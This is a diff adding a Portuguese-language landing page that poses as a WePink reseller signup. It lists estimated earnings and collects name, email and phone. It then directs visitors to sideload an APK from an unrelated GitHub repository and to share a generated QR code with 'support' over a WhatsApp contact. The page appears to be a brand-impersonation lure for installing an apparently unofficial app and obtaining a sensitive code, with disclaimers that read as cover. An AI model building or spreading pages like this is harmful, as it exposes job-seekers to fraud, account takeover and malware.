@@ -1,0 +1,69 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#ec4899">
+<meta name="description" content="Conheça as vantagens e faça seu cadastro de interesse para revendedora WePink.">
+<title>WePink | Seja uma Revendedora</title>
+<link rel="manifest" href="manifest.json">
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="brand" href="#" aria-label="WePink início"><span class="brand-mark">W</span><span>WePink<small>REVENDEDORA</small></span></a>
+  <a class="top-link" href="#vantagens">Conheça as vantagens</a>
+</header>
+<main>
+<section id="home" class="hero">
+  <div class="hero-glow"></div>
+  <div class="eyebrow"><span class="dot"></span> SEU PRÓXIMO PASSO COMEÇA AQUI</div>
+  <h1>Seu talento.<br><em>Seu negócio.</em><br>Seu futuro.</h1>
+  <p class="hero-copy">Conheça a oportunidade de fazer parte do time de revendedoras WePink e descubra uma nova forma de empreender.</p>
+  <a class="button primary" href="#cadastro">Quero ser revendedora <span>→</span></a>
+  <div class="hero-note"><span class="shield">✓</span> Cadastro simples • Experiência pelo celular</div>
+  <div class="hero-card">
+    <div class="card-top"><span>OPORTUNIDADE WE PINK</span><span class="spark">✦</span></div>
+    <div class="card-brand">W<span>e</span>Pink</div>
+    <div class="card-bottom"><span>Beleza, atitude e oportunidade.</span><span class="round-arrow">↗</span></div>
+  </div>
+</section>
+<section id="vantagens" class="section benefits">
+  <div class="section-kicker">POR QUE FAZER PARTE?</div>
+  <h2>Uma oportunidade<br>para chamar de sua.</h2>
+  <p class="muted">Conheça alguns motivos para dar o primeiro passo como revendedora.</p>
+  <div class="benefit-grid">
+    <article class="benefit"><div class="benefit-icon">✦</div><h3>Autonomia</h3><p>Organize sua rotina e desenvolva seu negócio no seu ritmo.</p></article>
+    <article class="benefit"><div class="benefit-icon">♡</div><h3>Beleza e conexão</h3><p>Apresente produtos e crie relacionamento com seus clientes.</p></article>
+    <article class="benefit"><div class="benefit-icon">↗</div><h3>Possibilidade de ganhos</h3><p>Os resultados dependem das vendas, custos e condições vigentes.</p></article>
+  </div>
+  <div class="earnings"><div><span class="section-kicker">ESTIMATIVA INFORMADA</span><h3>R$ 3.157,22 <span>até</span><br>R$ 7.921,11</h3><p>Estimativa de ganhos de revendedoras. Valores não garantidos; confirme período, critérios e condições com a equipe oficial antes de divulgar.</p></div><div class="earnings-star">✦</div></div>
+  <a class="button dark" href="#cadastro">Quero começar <span>→</span></a>
+</section>
+<section id="cadastro" class="section signup">
+  <div class="section-kicker">VAMOS COMEÇAR</div>
+  <h2>Seu cadastro<br><em>em poucos passos.</em></h2>
+  <p class="muted">Preencha os dados para continuar. Confira tudo antes de enviar.</p>
+  <form id="registrationForm" autocomplete="on">
+    <label for="fullName">Nome completo</label><input id="fullName" name="name" autocomplete="name" required placeholder="Digite seu nome completo">
+    <label for="email">E-mail</label><input id="email" name="email" type="email" autocomplete="email" required placeholder="voce@exemplo.com">
+    <label for="phone">WhatsApp (opcional)</label><input id="phone" name="phone" type="tel" inputmode="tel" autocomplete="tel" placeholder="(00) 00000-0000">
+    <div class="privacy-note"><span>ⓘ</span><p>Este formulário registra seu interesse em receber contato. Não informe senhas bancárias, senhas de conta ou códigos de segurança. Este site é independente e não deve ser considerado um canal oficial da WePink.</p></div>
+    <label class="checkline"><input id="confirmData" type="checkbox" required><span>Autorizo o uso destes dados para contato sobre meu cadastro e confirmo que revisei as informações.</span></label>
+    <button class="button primary full" type="submit">Concluir cadastro <span>→</span></button>
+  </form>
+</section>
+<section id="resultado" class="section result hidden">
+  <div class="success-mark">✓</div><div class="section-kicker">CADASTRO PREPARADO</div>
+  <h2>Próximos passos,<br><em>revendedora.</em></h2>
+  <p class="muted">Confira as etapas abaixo. Mantenha esta página aberta até terminar.</p>
+  <div class="step-card"><span class="step-number">01</span><div><h3>Baixe o aplicativo</h3><p>O download abre o arquivo do GitHub em uma nova etapa do navegador.</p><a id="downloadApk" class="button dark full" href="https://github.com/com0172654-max/Wipick/raw/a1b965584e676aa3208178fbc6b38f19e0680733/Revendedor%20Wepink.apk" target="_blank" rel="noopener">Baixar aplicativo APK <span>↓</span></a></div></div>
+  <div class="step-card"><span class="step-number">02</span><div><h3>Seu QR Code</h3><p>Seu código de referência não contém senhas nem dados pessoais completos.</p><div id="qrPayload" class="qr-payload"><div id="qrcode" aria-label="QR Code do cadastro"></div></div><button id="saveQr" class="button outline full" type="button">Salvar QR Code como imagem</button><button id="shareQr" class="button primary full" type="button">Compartilhar com o suporte <span>↗</span></button><p class="security-warning"><strong>Por segurança:</strong> este QR Code deve ser compartilhado somente com a equipe de suporte da WePink. A WePink não liga pedindo seu QR Code. Envie-o apenas por iniciativa própria ao finalizar o cadastro e somente pelo canal de suporte que você confirmou ser oficial.</p><p id="shareStatus" class="small-status" role="status"></p></div></div>
+  <button id="restart" class="text-button" type="button">Voltar ao início</button>
+</section>
+</main>
+<footer><div class="footer-brand">WePink<span>®</span></div><p>Uma experiência de cadastro independente para demonstração.</p><a href="https://wa.me/5551995293570" target="_blank" rel="noopener">Falar com o contato informado no material ↗</a><small>Este site é independente e não confirma vínculo oficial com a marca. Não compartilhe senhas ou códigos de segurança.</small><a href="/admin.html">Acesso administrativo</a></footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="app.js"></script>
+</body>
+</html>
